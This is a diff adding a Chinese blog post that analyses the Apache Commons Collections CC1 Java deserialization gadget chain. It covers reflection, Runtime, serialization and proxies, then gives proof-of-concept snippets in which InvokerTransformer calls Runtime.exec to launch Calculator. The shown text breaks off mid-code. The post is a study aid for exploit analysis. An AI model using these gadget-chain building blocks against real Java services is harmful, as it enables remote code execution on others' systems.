@@ -1,0 +1,1095 @@
+<!DOCTYPE html>
+<html lang="en-us" class="light">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.118.2">
+
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="generator" content="Saber v0.11.2">
+    <meta name="author" content="F0rmat" />
+    <meta name="keywords" content="专注于信息安全、内网渗透、红队攻防" />
+    <meta name="og:site_name" content="F0rmat&#39;s Blog" />
+    <link rel="canonical" href="https://xxe.icu/commonscollections1_chain_analysis.html" /><meta property="og:type" content="article" />
+    <meta property="title" content="Java代码审计-CommonsCollections1链分析 - F0rmat&#39;s Blog">
+    <meta property="og:title" content="Java代码审计-CommonsCollections1链分析 - F0rmat&#39;s Blog">
+    <meta property="twitter:title" content="Java代码审计-CommonsCollections1链分析 - F0rmat&#39;s Blog">
+    <meta name="description" content="0x00 前言 本文所讲述的CommonsCollections1链也被称为CC1链，它是属于Apache Commons Collections是Java中应用广泛">
+    <meta property="og:description" content="0x00 前言 本文所讲述的CommonsCollections1链也被称为CC1链，它是属于Apache Commons Collections是Java中应用广泛">
+    <meta property="twitter:description" content="0x00 前言 本文所讲述的CommonsCollections1链也被称为CC1链，它是属于Apache Commons Collections是Java中应用广泛">
+    <meta property="og:type" content="article">
+    <title>Java代码审计-CommonsCollections1链分析 - F0rmat&#39;s Blog</title>
+
+    <meta property="og:url" content="https://xxe.icu/commonscollections1_chain_analysis.html" />
+
+    
+    <meta property="og:image" content="https://avatars.githubusercontent.com/u/16066632?v=4">
+    <meta property="twitter:image" content="https://avatars.githubusercontent.com/u/16066632?v=4">
+    <link rel="shortcut icon" href="https://avatars.githubusercontent.com/u/16066632?v=4" type="image/x-png" />
+    
+      
+      <link rel="stylesheet" href="/css/main.min.dbdd30bb57b959228eef6e0f4a297b76d6edfad348d99701f8d68535ea50105a.css" integrity="sha256-290wu1e5WSKO724PSil7dtbt+tNI2ZcB+NaFNepQEFo="/>
+    
+    
+  <link rel="stylesheet" href="/css/syntax.css"/>
+
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_1607597_jhmihcvh0tm.css" />
+    <link href="/index.xml" rel="alternate" type="application/rss+xml" title="F0rmat&#39;s Blog">
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</head>
+
+<body class="bg-gray-100 dark:bg-gray-700 text-gray-900 dark:text-gray-100 tracking-wider leading-normal">
+
+    <nav id="header" class="bg-white dark:bg-gray-800 fixed w-full z-10 top-0 shadow">
+
+  <div id="progress" class="h-1 z-20 top-0" style="background:linear-gradient(to right, #4dc0b5 var(--scroll), transparent 0);"></div>
+
+  <div class="w-full container mx-auto flex flex-wrap items-center justify-between my-1">
+      <div class="pl-4">
+          <a class="text-base no-underline hover:no-underline font-bold"  href="/">
+              F0rmat&#39;s Blog
+          </a>
+      </div>
+
+      <div class="block lg:hidden pr-4">
+          <button id="nav-toggle" class="flex items-center px-3 py-2 border rounded text-gray-500 border-gray-600 hover:text-gray-900 hover:border-teal-500 appearance-none focus:outline-none">
+              <svg class="fill-current h-3 w-3" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><title>Menu</title><path d="M0 3h20v2H0V3zm0 6h20v2H0V9zm0 6h20v2H0v-2z"/></svg>
+          </button>
+      </div>
+
+      <div class="w-full flex-grow lg:flex lg:items-center lg:w-auto hidden mt-2 lg:mt-0 bg-gray-100 dark:bg-gray-800 md:bg-transparent z-20" id="nav-content">
+          <ul class="list-none lg:flex justify-end flex-1 items-center">
+                    <li class="mr-3">
+                    <a href="/" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">HOME</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/posts.html" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">ARCHIVE</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/about.html" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">ABOUT</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/atom.xml" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">RSS</a>
+                    </li>
+                <button id="switchTheme" class="h-10 w-10 flex justify-center items-center focus:outline-none">
+                    <div id="dark-icon" class="hidden">
+                        <svg data-v-297af853="" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="w-6 h-6"><title data-v-297af853="">Dark Mode</title> <path data-v-297af853="" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path></svg>
+                    </div>
+                    <div id="light-icon">
+                        <svg data-v-297af853="" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="w-6 h-6"><title data-v-297af853="">Light Mode</title> <path data-v-297af853="" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path></svg>
+                    </div> 
+                </button>
+          </ul>
+      </div>
+  </div>
+</nav>
+
+    <div id="container" class="container w-full flex flex-wrap mx-auto px-2 lg:pt-12 mt-10">
+<section class="w-full lg:w-3/4 xl:w-3/4">
+
+    
+    <div class="px-8 py-6 mt-6 lg:mt-0 leading-normal rounded shadow bg-white dark:bg-gray-800">
+
+        
+        <div>
+    <h1 class="font-bold break-normal text-gray-800 pt-2 pb-2 text-2xl lg:text-3xl dark:text-gray-200">
+        <a href="https://xxe.icu/commonscollections1_chain_analysis.html" title="Java代码审计-CommonsCollections1链分析">Java代码审计-CommonsCollections1链分析</a>
+    </h1>
+    <p class="mb-1 text-sm text-gray-500 dark:text-gray-200">
+        <span title=" 2022-11-22 11:04:34 CST">
+            <i class="iconfont icon-calendar" aria-hidden="true"></i> 22 Nov 2022
+        </span>
+
+        <span class="hidden xl:inline-block">
+            |
+            <i class="iconfont icon-book"></i>
+            10046 字
+        </span>
+
+        <span class="hidden xl:inline-block">
+            |
+            <i class="iconfont icon-clock-o"></i>
+            21 分钟读完
+        </span>
+    </p>
+</div>
+
+
+        <div class="md:hidden dark:text-gray-100">
+            
+<p class="text-base font-bold py-2 yg:pb-6 text-gray-700 dark:text-gray-300">文章目录</p>
+    <div class="sticky text-sm" style="top:6em;" id="menu-content">
+        <nav id="TableOfContents">
+  <ul>
+        <li><a href="#0x00-前言">0x00 前言</a>
+          <ul>
+            <li><a href="#环境准备">环境准备</a></li>
+          </ul>
+        </li>
+        <li><a href="#0x01-基础">0x01 基础</a>
+          <ul>
+            <li><a href="#反射机制">反射机制</a></li>
+            <li><a href="#java-runtime类">Java Runtime类</a></li>
+            <li><a href="#java-反序列化">Java 反序列化</a></li>
+            <li><a href="#java-注解">Java 注解</a></li>
+            <li><a href="#java-代理">Java 代理</a></li>
+            <li><a href="#疑问解答点">疑问解答点</a></li>
+          </ul>
+        </li>
+        <li><a href="#0x02-transformedmap链分析">0x02 TransformedMap链分析</a></li>
+        <li><a href="#0x03-lazymap链分析">0x03 LazyMap链分析</a></li>
+        <li><a href="#0x04-总结">0x04 总结</a></li>
+        <li><a href="#0x05-参考">0x05 参考</a></li>
+      </ul>
+</nav>
+    </div>
+
+        </div> 
+
+        <div class="post-content dark:text-gray-300">
+            <h2 id="0x00-前言">0x00 前言</h2>
+<p>本文所讲述的CommonsCollections1链也被称为CC1链，它是属于Apache Commons Collections是Java中应用广泛的一个库，Apache Commons Collections是Apache软件基金会的项目，是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。其目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。作为Apache开源项目的重要组件，<a href="http://commons.apache.org/proper/commons-collections/">Commons Collections</a>包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充，让应用程序在开发的过程中，既保证了性能，也能大大简化代码，故而被广泛应用于各种Java应用的开发。</p>
+<p>尽管它的初衷是好的，但其中有一些代码不严谨，导致很多引用了这个库的Java应用程序(如WebLogic、Websphere、Jboss、Jenkin等)会产生RCE漏洞。Apache Commons Collections的漏洞最初在2015年11月6日由FoxGlove Security安全团队的<a href="https://github.com/breenmachine">@breenmachine</a> 在一篇长博客上阐述，危害面覆盖了大部分的Web中间件，影响十分深远，横扫了WebLogic、WebSphere、JBoss、Jenkins、OpenNMS的最新版。</p>
+<h3 id="环境准备">环境准备</h3>
+<p>调试工具：IDEA</p>
+<p>Java版本：8u65，下载地址：https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</p>
+<p>8u65源码：下载地址：https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip</p>
+<p>pom文件配置：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"> <span class="nt">&lt;dependencies&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;groupId&gt;</span>commons-collections<span class="nt">&lt;/groupId&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>commons-collections<span class="nt">&lt;/artifactId&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;version&gt;</span>3.2.1<span class="nt">&lt;/version&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependencies&gt;</span>
+</span></span></code></pre></div><blockquote>
+<p>工具安装、Java版本配置、源码加载这些建议从网上补一下这方面的知识</p>
+</blockquote>
+<h2 id="0x01-基础">0x01 基础</h2>
+<h3 id="反射机制">反射机制</h3>
+<p>一开始看到反射就联想到反弹shell一类的内容，其实与那些并无干系，反射机制是Java的一种特性，可以理解为在运行中（而非编译期间）获取对象类型信息的操作。传统的编程方法要求程序员在编译阶段决定使用的类型，但是在反射的帮助下，我们可以动态获取这些信息，从而编写更加具有可移植性的代码。当然，反射并非某种编程语言的特性，理论上使用任何一种语言都可以实现反射机制，但是像Java语言本身支持反射，那反射的实现就会方便很多。</p>
+<p>根据网上的资料，JAVA反射机制的功能可以用如下几句话简要描述：
+在运行状态中，判断任意一个对象所属的类；
+在运行状态中，构造任意一个类的对象；
+在运行状态中，获取或修改任意一个类所具有的成员变量和方法；
+在运行状态中，调用任意一个对象的方法；
+另外还可生成动态代理和获取类的其他信息。</p>
+<p>我们知道在Java中一切都是对象，我们一般所使用的对象都直接或间接继承自Object类。Object类中包含一个方法名叫getClass，利用这个方法就可以获得一个实例的类型类。
+需要注意的是，反射机制在运行时只能调用methods或改变fields内容，却无法修改程序结构或变量类型。</p>
+<h3 id="java-runtime类">Java Runtime类</h3>
+<p>Runtime类封装了运行时的环境，每个 Java 应用程序都有一个 Runtime 类实例，使应用程序能够与其运行的环境相连接。一旦得到了一个当前的Runtime对象的引用，就可以调用Runtime对象的方法去控制Java虚拟机的状态和行为。</p>
+<p>一般情况下，不能实例化一个Runtime对象，应用程序也不能创建自己的 Runtime 类实例，但可以通过 getRuntime() 方法获取当前Runtime运行时对象的引用。</p>
+<p>Runtime类提供了很多有价值的API，文中用到的主要就是exec(String command) （即在单独的进程中执行指定的字符串命令）。</p>
+<h3 id="java-反序列化">Java 反序列化</h3>
+<p>序列化就是把对象转换成字节流，便于传输和保存在内存、文件、数据库中；反序列化是序列化的逆过程，即将有结构的字节流还原成对象。</p>
+<p><img src="https://p4.ssl.qhimg.com/t01498bc259257de9d1.png" alt="img"></p>
+<p>在Java中，java.io.ObjectOutputStream代表对象输出流，它的writeObject(Object obj)方法可对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。</p>
+<p>与之对应，java.io.ObjectInputStream代表对象输入流，它的readObject()方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。</p>
+<p>对象序列化包括如下步骤：</p>
+<p>1） 创建一个对象输出流，它可以包装一个其他类型的目标输出流，如文件输出流；</p>
+<p>2） 通过对象输出流的writeObject()方法写对象。</p>
+<p>对象反序列化的步骤如下：</p>
+<p>1） 创建一个对象输入流，它可以包装一个其他类型的源输入流，如文件输入流；</p>
+<p>2） 通过对象输入流的readObject()方法读取对象。</p>
+<p>只有实现了Serializable和Externalizable接口的类且所有属性(用transient关键字修饰的属性除外，不参与序列化过程)都是可序列化的对象才能被序列化。在序列化（反序列化）的时候，ObjectOutputStream（ObjectInputStream）会寻找目标类中的重写的writeObject（readObject）方法，赋值给变量writeObjectMethod（readObjectMethod）。</p>
+<p><img src="https://p3.ssl.qhimg.com/t019c4322062818569d.png" alt="img"></p>
+<h3 id="java-注解">Java 注解</h3>
+<p>Java 注解（Annotation）又称 Java 标注，是 JDK5.0 引入的一种注释机制。Java 语言中的类、方法、变量、参数和包等都可以被标注。和 Javadoc 不同，Java 标注可以通过反射获取标注内容。在编译器生成类文件时，标注可以被嵌入到字节码中。Java 虚拟机可以保留标注内容，在运行时可以获取到标注内容，也支持自定义 Java 标注。</p>
+<p>Java 定义了一套注解，Java7之前有 7 个，3个在java.lang中，4个在 java.lang.annotation 中。</p>
+<p>作用于代码的注解是如下3个，</p>
+<p><a href="https://github.com/Override">@Override</a> – 检查该方法是否是重写方法。如果发现其父类，或者是引用的接口中并没有该方法时，会报编译错误；</p>
+<p><a href="https://github.com/Deprecated">@Deprecated</a> – 标记过时方法。如果使用该方法，会报编译警告；</p>
+<p><a href="https://github.com/SuppressWarnings">@SuppressWarnings</a> – 指示编译器去忽略注解中声明的警告。</p>
+<p>作用于其他注解的注解(又称元注解)是如下4个，</p>
+<p><a href="https://github.com/Retention">@Retention</a> – 标识这个注解怎么保存，是只在代码中，还是编入class文件中，或者是在运行时可以通过反射访问；</p>
+<p><a href="https://github.com/Documented">@Documented</a> – 标记这些注解是否包含在用户文档中；</p>
+<p><a href="https://github.com/Target">@Target</a> – 标记这个注解应该是哪种 Java 成员，即指定 Annotation 的类型属性；</p>
+<p><a href="https://github.com/Inherited">@Inherited</a> – 标记这个注解是继承于哪个注解类(默认 注解并没有继承于任何子类)。</p>
+<h3 id="java-代理">Java 代理</h3>
+<p>代理模式是一种设计模式，提供了对目标对象额外的访问方式，即设置一个中间代理，通过代理对象访问目标对象，提供了对目标对象额外的访问方式，这样可以在不修改原目标对象的前提下，提供额外的功能操作，扩展目标对象的功能，以达到增强原对象的功能和简化访问方式。</p>
+<p><img src="https://p0.ssl.qhimg.com/t01462d72f25f6f5456.png" alt="img"></p>
+<p>Java提供了三种代理模式：静态代理、动态代理和cglib代理。
+静态代理方式需要代理对象和目标对象实现一样的接口。
+优点：可以在不修改目标对象的前提下扩展目标对象的功能；
+缺点：①冗余由于代理对象要实现与目标对象一致的接口，会产生过多的代理类。②不易维护。一旦接口增加方法，目标对象与代理对象都要进行修改。
+动态代理利用了JDK API，动态地在内存中构建代理对象，从而实现对目标对象的代理功能。动态代理又被称为JDK代理或接口代理。
+静态代理与动态代理的区别主要在于静态代理在编译时就已经实现，编译完成后代理类是一个实际的class文件，而动态代理是在运行时动态生成的，即编译完成后没有实际的class文件，而是在运行时动态生成类字节码，并加载到JVM中。
+特点：动态代理对象不需要实现接口，但是要求目标对象必须实现接口，否则不能使用动态代理。</p>
+<h3 id="疑问解答点">疑问解答点</h3>
+<p>何为链？专业术语也称为Gadget chain，在Java当中叫做调用链，从入口类重写的readObject方法经过一层一层类和方法，最终到达触发我们恶意代码的链路。</p>
+<p>下面会讲到<code>TransformedMap</code>和<code>LazyMap</code>这两个调用链，都来自于Common-Collections库，并继承AbstractMapDecorator。</p>
+<p>在ysoserial工具中CommonsCollections1链是使用<code>LazyMap</code>类，并不是<code>TransformedMap</code>类。</p>
+<p>在此之前初学者会有很多的疑问，比如：</p>
+<ol>
+<li>学CC1链为什么要用到TransformedMap类？</li>
+<li>ChainedTransformer和ConstantTransformer的作用是什么？</li>
+<li>为什么又要用到AnnotationInvocationHandler这个类呢？</li>
+<li>平常我们所说用ysoserial生成的CC链都是怎么利用到shiro和weblogic的呢？</li>
+</ol>
+<p>我们要先了解整个反序列化的过程，可以看到我们下面的过程图：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/commonscollections1_chain_analysis/1.png" alt="1"></p>
+<p>第一第二点疑问可以先参考过程图粗略了解一下，为什么要用AnnotationInvocationHandler类，因为它重写了readObject函数，注意，AnnotationInvocationHandler是不属于CommonsCollections库里面的，是JDK原有的库，而且为什么要8u65的版本进行测试，因为在8u71以后大概是2015年12月的时候，Java 官方修改了 sun.reflect.annotation.AnnotationInvocationHandler 的readObject函数。</p>
+<p>平时shiro和weblogic等应用的反序列化漏洞都是利用cc链进行攻击的，整个过程又是怎么样呢？我们可以知道反序列化最主要的是readObject函数，readObject主要是对字节码转成对象，然而我们要攻击就要把整个<code>可序列化</code>的payload进行序列化，转成readObject要使用的字节码。所以在shiro和weblogic等一些应用只要有可以接受外界的数据，并且这些数据还经过了readObject就能利用cc链进行攻击。</p>
+<h2 id="0x02-transformedmap链分析">0x02 TransformedMap链分析</h2>
+<p>我们从上面已经了解过了，CommonsCollections库是应用常用的，所以我们要在这个库里面找到一些我们可以利用的函数和类。当中InvokerTransformer（怎么找的？别问，问就是大佬已经找好了🐶）这个类就存在危险可操作的地方，比如里面的transform方法，而且也继承了Serializable接口，符合我们反序列化的条件，可以看到里面用到了反射：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">transform</span><span class="o">(</span><span class="n">Object</span> <span class="n">input</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">input</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">Class</span> <span class="n">cls</span> <span class="o">=</span> <span class="n">input</span><span class="o">.</span><span class="na">getClass</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">            <span class="n">Method</span> <span class="n">method</span> <span class="o">=</span> <span class="n">cls</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="n">iMethodName</span><span class="o">,</span> <span class="n">iParamTypes</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">method</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">input</span><span class="o">,</span> <span class="n">iArgs</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NoSuchMethodException</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="n">FunctorException</span><span class="o">(</span><span class="s">&#34;InvokerTransformer: The method &#39;&#34;</span> <span class="o">+</span> <span class="n">iMethodName</span> <span class="o">+</span> <span class="s">&#34;&#39; on &#39;&#34;</span> <span class="o">+</span> <span class="n">input</span><span class="o">.</span><span class="na">getClass</span><span class="o">()</span> <span class="o">+</span> <span class="s">&#34;&#39; does not exist&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IllegalAccessException</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="n">FunctorException</span><span class="o">(</span><span class="s">&#34;InvokerTransformer: The method &#39;&#34;</span> <span class="o">+</span> <span class="n">iMethodName</span> <span class="o">+</span> <span class="s">&#34;&#39; on &#39;&#34;</span> <span class="o">+</span> <span class="n">input</span><span class="o">.</span><span class="na">getClass</span><span class="o">()</span> <span class="o">+</span> <span class="s">&#34;&#39; cannot be accessed&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">InvocationTargetException</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="n">FunctorException</span><span class="o">(</span><span class="s">&#34;InvokerTransformer: The method &#39;&#34;</span> <span class="o">+</span> <span class="n">iMethodName</span> <span class="o">+</span> <span class="s">&#34;&#39; on &#39;&#34;</span> <span class="o">+</span> <span class="n">input</span><span class="o">.</span><span class="na">getClass</span><span class="o">()</span> <span class="o">+</span> <span class="s">&#34;&#39; threw an exception&#34;</span><span class="o">,</span> <span class="n">ex</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>是不是很熟悉，似成相识，我们来看一下我们之前利用反射处理的Runtime类只想计算器的代码：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;</span><span class="o">);</span> <span class="c1">//正射调用
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="n">Object</span> <span class="n">myRuntime</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;java.lang.Runtime&#34;</span><span class="o">).</span><span class="na">getMethod</span><span class="o">(</span><span class="s">&#34;getRuntime&#34;</span><span class="o">).</span><span class="na">invoke</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span><span class="c1">//反射调用
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">Method</span> <span class="n">exec</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;java.lang.Runtime&#34;</span><span class="o">).</span><span class="na">getMethod</span><span class="o">(</span><span class="s">&#34;exec&#34;</span><span class="o">,</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">exec</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">myRuntime</span><span class="o">,</span> <span class="s">&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;</span><span class="o">);</span>
+</span></span></code></pre></div><p>是不是该有的都有了，好，我们继续看下怎么使用InvokerTransformer类去利用，先来看下New一个对象需要传入什么参数，第一个是字符串，第二个是类数组，第三个是对象参数：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="nf">InvokerTransformer</span><span class="o">(</span><span class="n">String</span> <span class="n">methodName</span><span class="o">,</span> <span class="n">Class</span><span class="o">[]</span> <span class="n">paramTypes</span><span class="o">,</span> <span class="n">Object</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">super</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">iMethodName</span> <span class="o">=</span> <span class="n">methodName</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">iParamTypes</span> <span class="o">=</span> <span class="n">paramTypes</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">iArgs</span> <span class="o">=</span> <span class="n">args</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>我们可以写成下面这样就能触发计算器了，第一个也就是我们的exec方法，第二个要写成new Class[]就是要new一个class数组然后把类的类型放进来给它处理，第三个就是对应上面的new Object[]。如果还是看不懂可以把Runtime反射的代码带入到transform方法就一目了然了。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Object</span> <span class="n">input</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;java.lang.Runtime&#34;</span><span class="o">).</span><span class="na">getMethod</span><span class="o">(</span><span class="s">&#34;getRuntime&#34;</span><span class="o">).</span><span class="na">invoke</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">String</span> <span class="n">iMethodName</span> <span class="o">=</span> <span class="s">&#34;exec&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Class</span><span class="o">[]</span> <span class="n">iParamTypes</span> <span class="o">=</span> <span class="o">{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">};</span>
+</span></span><span class="line"><span class="cl"><span class="n">Object</span><span class="o">[]</span> <span class="n">iArgs</span> <span class="o">=</span> <span class="o">{</span><span class="s">&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;</span><span class="o">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">InvokerTransformer</span> <span class="n">invokerTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="n">iMethodName</span><span class="o">,</span> <span class="n">iParamTypes</span><span class="o">,</span> <span class="n">iArgs</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">invokerTransformer</span><span class="o">.</span><span class="na">transform</span><span class="o">(</span><span class="n">input</span><span class="o">);</span>
+</span></span></code></pre></div><blockquote>
+<p>注意，如果不知道InvokerTransformer对于实际开发到底发挥了什么作用，这个我们先不要深究，我们只用知道这个类和这个函数能利用，触发我们的代码即可，其他的下面处理完所有的类会一一解释</p>
+</blockquote>
+<p>我们把这段写成序列化再反序列化看看，看到是可以正常运行计算器的：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">String</span> <span class="n">iMethodName</span> <span class="o">=</span> <span class="s">&#34;exec&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Class</span><span class="o">[]</span> <span class="n">iParamTypes</span> <span class="o">=</span> <span class="o">{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">};</span>
+</span></span><span class="line"><span class="cl"><span class="n">Object</span><span class="o">[]</span> <span class="n">iArgs</span> <span class="o">=</span> <span class="o">{</span><span class="s">&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;</span><span class="o">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">InvokerTransformer</span> <span class="n">invokerTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="n">iMethodName</span><span class="o">,</span> <span class="n">iParamTypes</span><span class="o">,</span> <span class="n">iArgs</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ByteArrayOutputStream</span> <span class="n">barr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl"><span class="n">ObjectOutputStream</span> <span class="n">oss</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">barr</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">oss</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">invokerTransformer</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">oss</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">barr</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">ByteArrayInputStream</span><span class="o">(</span><span class="n">barr</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">()));</span>
+</span></span><span class="line"><span class="cl"><span class="n">InvokerTransformer</span> <span class="n">exec</span> <span class="o">=</span> <span class="o">(</span><span class="n">InvokerTransformer</span><span class="o">)</span> <span class="n">ois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl"><span class="n">Object</span> <span class="n">input</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;java.lang.Runtime&#34;</span><span class="o">).</span><span class="na">getMethod</span><span class="o">(</span><span class="s">&#34;getRuntime&#34;</span><span class="o">).</span><span class="na">invoke</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span>
